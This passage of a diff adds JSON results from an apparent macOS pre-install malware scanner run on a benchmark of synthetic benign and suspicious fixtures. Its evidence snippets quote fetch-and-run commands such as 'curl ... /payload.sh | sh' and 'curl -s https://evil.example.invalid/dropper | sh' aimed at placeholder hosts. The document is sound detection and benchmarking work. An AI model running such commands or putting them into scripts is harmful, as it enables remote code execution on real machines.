+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/shell\/noisy_shell_installer_like_01.sh",
+          "lineEnd" : 8,
+          "lineStart" : 8
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.invalid\/installer.sh | bash",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|8|8|-5029072431151668104",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/shell\/noisy_shell_installer_like_01.sh",
+          "lineEnd" : 8,
+          "lineStart" : 8
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.invalid\/installer.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|6479453370732703256",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/shell\/noisy_shell_installer_like_01.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.invalid\/installer.sh | bash",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-5029072431151668104",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/shell\/noisy_shell_installer_like_01.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "shell.curl_pipe_sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|6625469277741867092",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/shell\/noisy_shell_installer_like_01.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/shell\/noisy_shell_installer_like_01.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "856D88BC-0866-4A5E-AE54-E456D935304A",
+    "sampleID" : "noisy_shell_installer_like_01"
+  },
+  {
+    "detectedType" : "appleScript",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "low",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "do shell script \"echo '[dry-run] would run: \" & suspiciousCmd & \"'\"",
+        "evidenceStrength" : "weak",
+        "executionSemantics" : "dryRunOnly",
+        "explanation" : "AppleScript do shell script 可直接执行系统命令。",
+        "id" : "script|applescript.do_shell_script|2|2|-8306319244319263349",
+        "ruleID" : "applescript.do_shell_script",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_doshell_echo_02.applescript",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "AppleScript 调用 shell"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/dropper.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|1|1|-6198460763421718019",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_doshell_echo_02.applescript",
+          "lineEnd" : 1,
+          "lineStart" : 1
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/dropper.sh | sh",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|1|1|-6867184429366752688",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_doshell_echo_02.applescript",
+          "lineEnd" : 1,
+          "lineStart" : 1
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/dropper.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-6198460763421718019",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_doshell_echo_02.applescript"
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/dropper.sh | sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-6867184429366752688",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_doshell_echo_02.applescript"
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "applescript.do_shell_script",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|6158746946943158201",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_doshell_echo_02.applescript"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_doshell_echo_02.applescript"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "407AB191-43DD-4345-8CBB-6451D2B105D8",
+    "sampleID" : "suspicious_applescript_doshell_echo_02"
+  },
+  {
+    "detectedType" : "appleScript",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "tell application \"Terminal\"",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "脚本可驱动 Terminal 执行命令，存在行为链隐藏风险。",
+        "id" : "script|applescript.terminal_control|1|1|-2214705915413854807",
+        "ruleID" : "applescript.terminal_control",
+        "scoreDeltaBase" : 12,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_terminal_download_print_02.applescript",
+          "lineEnd" : 1,
+          "lineStart" : 1
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "控制 Terminal 应用"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/stage.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|3|3|-8115511085655602256",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_terminal_download_print_02.applescript",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/stage.sh | sh",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|3|3|-372699189467173564",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_terminal_download_print_02.applescript",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/stage.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-8115511085655602256",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_terminal_download_print_02.applescript"
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/stage.sh | sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-372699189467173564",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_terminal_download_print_02.applescript"
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "applescript.terminal_control",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|6347219866450744821",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_terminal_download_print_02.applescript"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_terminal_download_print_02.applescript"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "929180AD-6625-413F-B3D1-37CD4D5CAAF2",
+    "sampleID" : "suspicious_applescript_terminal_download_print_02"
+  },
+  {
+    "detectedType" : "appBundle",
+    "findings" : [
+      {
+        "category" : "network",
+        "confidence" : "low",
+        "detectedType" : "appBundle",
+        "evidenceSnippet" : "echo \"[dry-run] would run: curl -fsSL https:\/\/example.com\/payload.sh | sh\"",
+        "evidenceStrength" : "weak",
+        "executionSemantics" : "dryRunOnly",
+        "explanation" : "检测到 curl 输出直接通过管道进入 sh\/bash\/zsh，属于典型远程代码直接执行链。",
+        "id" : "script|shell.curl_pipe_sh|3|3|-7401219194746895443",
+        "ruleID" : "shell.curl_pipe_sh",
+        "scoreDeltaBase" : 35,
+        "severity" : "critical",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/SyntheticSuspiciousFixture_02.app",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "appBundle"
+        ],
+        "title" : "curl 下载后直接管道执行"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "appBundle",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/payload.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|3|3|-351520344041767655",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/SyntheticSuspiciousFixture_02.app",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "appBundle"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "appBundle",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/payload.sh | sh",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|3|3|-2563792234122325616",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/SyntheticSuspiciousFixture_02.app",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "appBundle"
+        ],
+        "title" : "Threat Intel regexp"
+      }
+    ],
+    "id" : "B4C4601A-FB0B-498A-BC5E-28745AC9D7AE",
+    "sampleID" : "suspicious_hybrid_app_bundle_fixture_02"
+  },
+  {
+    "detectedType" : "appleScript",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "curl -s https:\/\/evil.example.invalid\/dropper",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|0|0|2760697183454113705",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_chain_sim_01.json"
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "curl -s https:\/\/evil.example.invalid\/dropper | sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|0|0|6308101143411409173",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_chain_sim_01.json"
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "curl -s https:\/\/evil.example.invalid\/dropper",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|2760697183454113705",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_chain_sim_01.json"
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "curl -s https:\/\/evil.example.invalid\/dropper | sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|6308101143411409173",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_chain_sim_01.json"
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "osascript",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-3145047241334268879",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_chain_sim_01.json"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "curl ",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|3960448275317208343",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_chain_sim_01.json"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "regexp:curl -s https:\/\/evil.example.invalid\/dropper",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1076680239875981422",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_chain_sim_01.json"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "medium",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "regexp:curl -s https:\/\/evil.example.invalid\/dropper | sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|3405038641177100254",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_chain_sim_01.json"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "ED0370A0-8BAF-45F3-9C40-BB4553E4F031",
+    "sampleID" : "suspicious_hybrid_chain_sim_01"
+  },
+  {
+    "detectedType" : "archive",
+    "findings" : [
+      {
+        "category" : "network",
+        "confidence" : "high",
+        "detectedType" : "archive",
+        "evidenceSnippet" : "echo \"[string] curl -fsSL https:\/\/example.com\/bootstrap.sh | sh\"",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "downloadExecuteLike",
+        "explanation" : "检测到 curl 输出直接通过管道进入 sh\/bash\/zsh，属于典型远程代码直接执行链。",
+        "id" : "script|shell.curl_pipe_sh|5|5|-3414587493870478168",
+        "ruleID" : "shell.curl_pipe_sh",
+        "scoreDeltaBase" : 35,
+        "severity" : "critical",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_dmg_mirror_fixture_02",
+          "lineEnd" : 5,
+          "lineStart" : 5
+        },
+        "tags" : [
+          "script",
+          "archive"
+        ],
+        "title" : "curl 下载后直接管道执行"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "archive",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/bootstrap.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|5|5|5048347646719074280",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_dmg_mirror_fixture_02",
+          "lineEnd" : 5,
+          "lineStart" : 5
+        },
+        "tags" : [
+          "script",
+          "archive"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "archive",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/bootstrap.sh | sh",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|5|5|-8714543128362780906",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_dmg_mirror_fixture_02",
+          "lineEnd" : 5,
+          "lineStart" : 5
+        },
+        "tags" : [
+          "script",
+          "archive"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "archive",
+        "evidenceSnippet" : "shell.curl_pipe_sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|6625469277741867092",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_dmg_mirror_fixture_02"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "archive",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_dmg_mirror_fixture_02"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "2EE1139B-478D-40E4-A2FF-B81D9302C050",
+    "sampleID" : "suspicious_hybrid_dmg_mirror_fixture_02"
+  },
+  {
+    "detectedType" : "pkg",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "pkg",
+        "evidenceSnippet" : "cat > \"$mirror_plist_dir\/com.synthetic.pkg.postinstall.mirror.plist",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|8|8|6943561693940362060",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_pkg_fixture_02",
+          "lineEnd" : 8,
+          "lineStart" : 8
+        },
+        "tags" : [
+          "script",
+          "pkg"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "installer",
+        "confidence" : "medium",
+        "detectedType" : "pkg",
+        "evidenceSnippet" : "#!\/usr\/bin\/env bash\nset -euo pipefail\nPROJECT_ROOT=\"$(cd \"$(dirname \"$0\")\/..\/..\/..\/..\" && pwd)\"",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "commentOnly",
+        "explanation" : "Package pre\/post install scripts can execute with installer privileges.",
+        "id" : "pkg.script|8347464613066929256",
+        "ruleID" : "pkg.install.script",
+        "scoreDeltaBase" : 11,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_pkg_fixture_02",
+          "keyPath" : "\/scripts\/postinstall.sh"
+        },
+        "tags" : [
+          "pkg",
+          "postinstall.sh"
+        ],
+        "title" : "Installer script discovered"
+      },
+      {
+        "category" : "installer",
+        "confidence" : "medium",
+        "detectedType" : "pkg",
+        "evidenceSnippet" : "#!\/usr\/bin\/env bash\nset -euo pipefail\necho \"[dry-run] preinstall checks only\"",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "commentOnly",
+        "explanation" : "Package pre\/post install scripts can execute with installer privileges.",
+        "id" : "pkg.script|1564293246816577367",
